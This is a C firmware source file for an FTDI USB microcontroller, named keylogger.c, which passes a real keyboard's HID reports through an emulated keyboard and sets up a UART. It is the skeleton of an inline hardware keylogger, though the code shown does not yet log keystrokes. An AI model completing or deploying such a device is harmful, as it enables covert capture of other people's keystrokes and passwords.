/*
** Filename: keylogger.c
**
** Automatically created by Application Wizard 2.0.2
** 
** Part of solution keylogger in project keylogger
**
** Comments: 
**
** Important: Sections between markers "FTDI:S*" and "FTDI:E*" will be overwritten by
** the Application Wizard
*/

#include "keylogger.h"

/* FTDI:STP Thread Prototypes */
vos_tcb_t *tcbFIRMWARE;

char buf[64];

void firmware();
/* FTDI:ETP */

/* FTDI:SDH Driver Handles */
VOS_HANDLE hUSBHOST_1; // USB Host Port 1
VOS_HANDLE hUSBSLAVE_2; // USB Slave Port 2
VOS_HANDLE hUART; // UART Interface Driver
VOS_HANDLE hUSBSLAVE_HID; // Emulates a HID device using the USB Slave Interface
VOS_HANDLE hUSBHOST_HID; // Connects to a HIDdevice on the USB Host Interface
/* FTDI:EDH */

/* Declaration for IOMUx setup function */
void iomux_setup(void);

/* Main code - entry point to firmware */
void main(void)
{
	/* FTDI:SDD Driver Declarations */
	// UART Driver configuration context
	uart_context_t uartContext;
	// USB Host configuration context
	usbhost_context_t usbhostContext;
	/* FTDI:EDD */

	/* FTDI:SKI Kernel Initialisation */
	vos_init(50, VOS_TICK_INTERVAL, VOS_NUMBER_DEVICES);
	vos_set_clock_frequency(VOS_48MHZ_CLOCK_FREQUENCY);
	vos_set_idle_thread_tcb_size(512);
	/* FTDI:EKI */

	iomux_setup();

	/* FTDI:SDI Driver Initialisation */
	// Initialise USB Slave Port 1
	usbslave_init(1, VOS_DEV_USBSLAVE_2);
	
	// Initialise UART
	uartContext.buffer_size = VOS_BUFFER_SIZE_128_BYTES;
	uart_init(VOS_DEV_UART,&uartContext);
	
	// Initialise USB Slave HID Driver with periodic endpoint size of 8 bytes
	usbSlaveHID_init(VOS_DEV_USBSLAVE_HID, 8);
	
	// Initialise USB HID Device
	usbHostHID_init(VOS_DEV_USBHOST_HID);
	
	// Initialise USB Host
	usbhostContext.if_count = 8;
	usbhostContext.ep_count = 16;
	usbhostContext.xfer_count = 2;
	usbhostContext.iso_xfer_count = 2;
	usbhost_init(VOS_DEV_USBHOST_1, -1, &usbhostContext);
	/* FTDI:EDI */

	/* FTDI:SCT Thread Creation */
	tcbFIRMWARE = vos_create_thread_ex(20, 4096, firmware, "Application", 0);
	/* FTDI:ECT */

	vos_start_scheduler();

main_loop:
	goto main_loop;
}


unsigned char usbslave_connect(VOS_HANDLE hUSB)
{
    usbslave_ioctl_cb_t iocb;
    unsigned char ret;

    iocb.ioctl_code = VOS_IOCTL_USBSLAVE_CONNECT;
    iocb.set = (void *) 0;
    ret = vos_dev_ioctl(hUSB, &iocb);
    
    return ret;
}

unsigned char usbslave_disconnect(VOS_HANDLE hUSB)
{
    usbslave_ioctl_cb_t iocb;
    unsigned char ret;

    iocb.ioctl_code = VOS_IOCTL_USBSLAVE_DISCONNECT;
    iocb.set = (void *) 0;
    vos_dev_ioctl(hUSB, &iocb);

    return ret;
}


VOS_HANDLE hid_slave_attach(VOS_HANDLE hUSB, unsigned char devSlaveHID)
{
	common_ioctl_cb_t hid_iocb;
	VOS_HANDLE hSlaveHID;

	// open HID driver
	hSlaveHID = vos_dev_open(devSlaveHID);

	// attach HID Keyboard to USB Slave port
	hid_iocb.ioctl_code = VOS_IOCTL_USBSLAVEHID_ATTACH;
	hid_iocb.set.data   = (void*)hUSB;
	if (vos_dev_ioctl(hSlaveHID, &hid_iocb) != USBSLAVE_OK)
	{
		vos_dev_close(hSlaveHID);
		hSlaveHID = NULL;
	}

	return hSlaveHID;
}

void hid_slave_detach(VOS_HANDLE hSlaveHID)
{
	common_ioctl_cb_t hid_iocb;

	if (hSlaveHID)
	{
		hid_iocb.ioctl_code = VOS_IOCTL_USBSLAVEHID_DETACH;

		vos_dev_ioctl(hSlaveHID, &hid_iocb);
		vos_dev_close(hSlaveHID);
	}
}




void HID_detach(VOS_HANDLE hHID)
{
	usbHostHID_ioctl_t hid_iocb;

	if (hHID)
	{
		hid_iocb.ioctl_code = VOS_IOCTL_USBHOSTHID_DETACH;

		vos_dev_ioctl(hHID, &hid_iocb);
		vos_dev_close(hHID);
	}
}

/* FTDI:ESP */

void open_drivers(void)
{
        /* Code for opening and closing drivers - move to required places in Application Threads */
        /* FTDI:SDA Driver Open */
        // hUSBSLAVE_2 = vos_dev_open(VOS_DEV_USBSLAVE_2);
        hUART = vos_dev_open(VOS_DEV_UART);
        /* FTDI:EDA */
}

void attach_drivers(void)
{
        /* FTDI:SUA Layered Driver Attach Function Calls */
        //hUSBSLAVE_HID = hid_slave_attach(hUSBSLAVE_2, VOS_DEV_USBSLAVE_HID);
        //hUSBHOST_HID = hid_attach(hUSBHOST_1, VOS_DEV_USBHOST_HID);
        /* FTDI:EUA */
}

void close_drivers(void)
{
        /* FTDI:SDB Driver Close */
        vos_dev_close(hUSBSLAVE_2);
        vos_dev_close(hUART);
        /* FTDI:EDB */
}

/* Application Threads */

void firmware()
{
	/* Thread code to be added here */
	common_ioctl_cb_t uart_iocb;
	usbhost_ioctl_cb_vid_pid_t hc_iocb_vid_pid;
	usbHostHID_ioctl_t	hid_iocb;
	
	unsigned short num_xfer;
	unsigned short len;
	
	unsigned char status;
	
	open_drivers();
	
	uart_iocb.ioctl_code = VOS_IOCTL_UART_SET_BAUD_RATE;
	uart_iocb.set.uart_baud_rate = UART_BAUD_115200;
	vos_dev_ioctl(hUART,&uart_iocb);
		
	uart_iocb.ioctl_code = VOS_IOCTL_UART_SET_FLOW_CONTROL;
	uart_iocb.set.param = UART_FLOW_NONE;
	vos_dev_ioctl(hUART,&uart_iocb);

	while(1) {
		hUSBHOST_1 = vos_dev_open(VOS_DEV_USBHOST_1);
		
		status = enumerate_device(&hc_iocb_vid_pid);
		
		if (hUSBHOST_HID) {
			hUSBSLAVE_2 = vos_dev_open(VOS_DEV_USBSLAVE_2);
			
			init_slave_kbd_driver(&hc_iocb_vid_pid);
			//usbslave_connect(hUSBSLAVE_HID);
			
			status = get_report_descriptor(&hid_iocb, buf);
			
			while(status == USBHOSTHID_OK) {
				status = get_report(&hid_iocb, buf, &len);
				vos_dev_write(hUSBSLAVE_HID, buf, len, &num_xfer);
			}
			
			// Host
			HID_detach(hUSBHOST_HID);
			// Device
			//usbslave_disconnect(hUSBSLAVE_HID);
			hid_slave_detach(hUSBSLAVE_HID);
			if (hUSBSLAVE_2)
				vos_dev_close(hUSBSLAVE_2);
		}
		
		if (hUSBHOST_1)
			vos_dev_close(hUSBHOST_1);
	}
	
	close_drivers();
}

